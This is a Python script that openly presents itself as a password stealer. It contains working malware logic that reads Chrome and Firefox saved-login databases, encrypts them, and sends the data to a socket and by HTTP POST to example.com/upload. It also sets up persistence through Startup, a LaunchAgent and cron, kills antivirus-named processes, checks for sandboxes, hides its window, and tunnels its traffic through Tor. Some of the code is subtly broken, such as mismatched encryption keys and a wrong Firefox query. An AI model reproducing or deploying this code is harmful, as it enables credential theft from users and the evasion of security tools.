import os
import sys
import socket
import threading
import time
import subprocess
import psutil
import ctypes
import sqlite3
import requests
import random
import shutil
from cryptography.fernet import Fernet
from PIL import Image
import socks

# Step 1: Disguised Payload
def innocent_function():
    # Simulate a harmless activity
    print("Executing harmless function...")
    time.sleep(1)
    if sys.platform == 'win32':
        os.system('systeminfo')
    else:
        os.system('uname -a')

# Step 2: Entrance Point
def main():
    # Trigger the Password Stealer's execution
    innocent_function()
    password_stealer()

# Step 3: Password Stealing Mechanism
def password_stealer():
    threading.Thread(target=steal_passwords).start()
    threading.Thread(target=send_data_to_server).start()
    threading.Thread(target=conceal_malicious_activity).start()
    threading.Thread(target=establish_persistence).start()
    threading.Thread(target=evade_detection).start()
    threading.Thread(target=exfiltrate_data_via_http).start()
    threading.Thread(target=randomized_task_scheduler).start()
    threading.Thread(target=environment_analysis).start()
    threading.Thread(target=self_destruction_timer, args=(3600,)).start()

def steal_passwords():
    try:
        passwords = []
        if sys.platform == 'win32':
            chrome_path = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
            firefox_path = os.path.expanduser('~') + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\'
        elif sys.platform == 'darwin':  # macOS
            chrome_path = os.path.expanduser('~') + '/Library/Application Support/Google/Chrome/Default/Login Data'
            firefox_path = os.path.expanduser('~') + '/Library/Application Support/Firefox/Profiles/'
        else:  # Linux
            chrome_path = os.path.expanduser('~') + '/.config/google-chrome/Default/Login Data'
            firefox_path = os.path.expanduser('~') + '/.mozilla/firefox/'
        
        # Extract passwords from Chrome
        try:
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            rows = cursor.fetchall()
            for row in rows:
                passwords.append(f"Chrome - URL: {row[0]}, Username: {row[1]}, Password: {row[2]}")
            conn.close()
        except Exception as e:
            print(f"Error extracting passwords from Chrome: {e}")

        # Extract passwords from Firefox
        try:
            for file_name in os.listdir(firefox_path):
                file_path = os.path.join(firefox_path, file_name)
                if file_name.endswith('.sqlite'):
                    conn = sqlite3.connect(file_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin, usernameField, passwordField FROM logins')
                    rows = cursor.fetchall()
                    for row in rows:
                        passwords.append(f"Firefox - URL: {row[0]}, Username: {row[1]}, Password: {row[2]}")
                    conn.close()
        except Exception as e:
            print(f"Error extracting passwords from Firefox: {e}")

        encrypted_passwords = encrypt_data('\n'.join(passwords), Fernet.generate_key())
        store_encrypted_data(encrypted_passwords)
        print("Stolen passwords")
    except Exception as e:
        print(f"Error stealing passwords: {e}")

def encrypt_data(data, key):
    cipher_suite = Fernet(key)
    encrypted_data = cipher_suite.encrypt(data.encode())
    return encrypted_data

def decrypt_data(encrypted_data, key):
    cipher_suite = Fernet(key)
    decrypted_data = cipher_suite.decrypt(encrypted_data).decode()
    return decrypted_data

def store_encrypted_data(data, filename='stolen_data.txt'):
    key = Fernet.generate_key()
    with open('encryption_key.txt', 'wb') as key_file:
        key_file.write(key)
    with open(filename, 'wb') as file:
        file.write(data)

def send_data_to_server():
    try:
        server_address = ('127.0.0.1', 12345)
        with open('stolen_data.txt', 'rb') as file:
            data = file.read()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(server_address)
        sock.sendall(data)
        sock.close()
        print(f"Sent data to {server_address}")
    except Exception as e:
        print(f"Error sending data: {e}")

def exfiltrate_data_via_http():
    try:
        url = 'http://example.com/upload'
        files = {'file': open('stolen_data.txt', 'rb')}
        response = requests.post(url, files=files)
        print(f"Exfiltrated data via HTTP: {response.status_code}")
    except Exception as e:
        print(f"Error exfiltrating data via HTTP: {e}")

def conceal_malicious_activity():
    try:
        if sys.platform == 'win32':
            ctypes.windll.kernel32.SetConsoleTitleW("Notepad")
        elif sys.platform == 'darwin':
            os.system('osascript -e \'tell application "System Events" to set visible of process "Python" to false\'')
        else:
            os.system('xterm -T "Notepad"')
        print("Concealing malicious activity...")
        while True:
            time.sleep(10)
    except Exception as e:
        print(f"Error concealing activity: {e}")

def establish_persistence():
    try:
        if sys.platform == 'win32':
            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            script_path = os.path.abspath(__file__)
            if not os.path.exists(startup_path):
                os.makedirs(startup_path)
            shutil.copy(script_path, startup_path)
        elif sys.platform == 'darwin':
            plist_content = f'''
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.example.malware</string>
                <key>ProgramArguments</key>
                <array>
                    <string>{os.path.abspath(__file__)}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
            </dict>
            </plist>
            '''
            plist_path = os.path.expanduser('~/Library/LaunchAgents/com.example.malware.plist')
            with open(plist_path, 'w') as plist_file:
                plist_file.write(plist_content)
            os.system(f'launchctl load {plist_path}')
        else:
            cron_job = f'@reboot {os.path.abspath(__file__)}'
            with open('mycron', 'w') as cron_file:
                cron_file.write(cron_job)
            os.system('crontab mycron')
            os.remove('mycron')
        print("Establishing persistence...")
    except Exception as e:
        print(f"Error establishing persistence: {e}")

def evade_detection():
    try:
        while True:
            for proc in psutil.process_iter():
                try:
                    if proc.name().lower() in ['antivirus.exe', 'securitysoftware.exe', 'defender.exe']:
                        proc.kill()
                        print(f"Killed process: {proc.name()}")
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            time.sleep(10)
    except Exception as e:
        print(f"Error evading detection: {e}")

def randomized_task_scheduler():
    try:
        while True:
            task_choice = random.choice([
                steal_passwords,
                send_data_to_server,
                exfiltrate_data_via_http,
                conceal_malicious_activity,
                establish_persistence,
                evade_detection
            ])
            task_thread = threading.Thread(target=task_choice)
            task_thread.start()
            sleep_time = random.randint(10, 60)
            time.sleep(sleep_time)
    except Exception as e:
        print(f"Error in randomized task scheduler: {e}")

def environment_analysis():
    try:
        suspicious_terms = ['microsoft', 'vmware', 'virtualbox', 'sandbox']
        if any(term in os.uname().release.lower() for term in suspicious_terms):
            print("Suspicious environment detected. Exiting.")
            sys.exit(1)
    except Exception as e:
        print(f"Error in environment analysis: {e}")

def encode_steganography(input_image_path, data, output_image_path):
    image = Image.open(input_image_path)
    binary_data = ''.join(format(ord(char), '08b') for char in data)
    binary_data += '1111111111111110'  # EOF marker

    data_index = 0
    pixel_data = list(image.getdata())

    for i in range(len(pixel_data)):
        pixel = list(pixel_data[i])
        for j in range(3):  # RGB channels
            if data_index < len(binary_data):
                pixel[j] = pixel[j] & ~1 | int(binary_data[data_index])
                data_index += 1
        pixel_data[i] = tuple(pixel)

    image.putdata(pixel_data)
    image.save(output_image_path)
    print("Data encoded into image")

def self_destruction_timer(timeout):
    time.sleep(timeout)
    if not provide_decryption_key():
        destroy_encrypted_files()

def provide_decryption_key():
    # Simulate user prompt for the decryption key
    key_provided = input("Enter the decryption key to prevent self-destruction: ")
    try:
        # Try to decrypt a small piece of data to verify the key
        decrypt_data(encrypt_data("test", key_provided), key_provided)
        return True
    except Exception as e:
        print(f"Invalid decryption key: {e}")
        return False

def destroy_encrypted_files():
    try:
        if os.path.exists('stolen_data.txt'):
            os.remove('stolen_data.txt')
        if os.path.exists('encryption_key.txt'):
            os.remove('encryption_key.txt')
        print("Encrypted files destroyed due to invalid decryption key")
    except Exception as e:
        print(f"Error destroying files: {e}")

def setup_proxy():
    # Example: setting up Tor as a proxy
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

if __name__ == "__main__":
    setup_proxy()
    main()
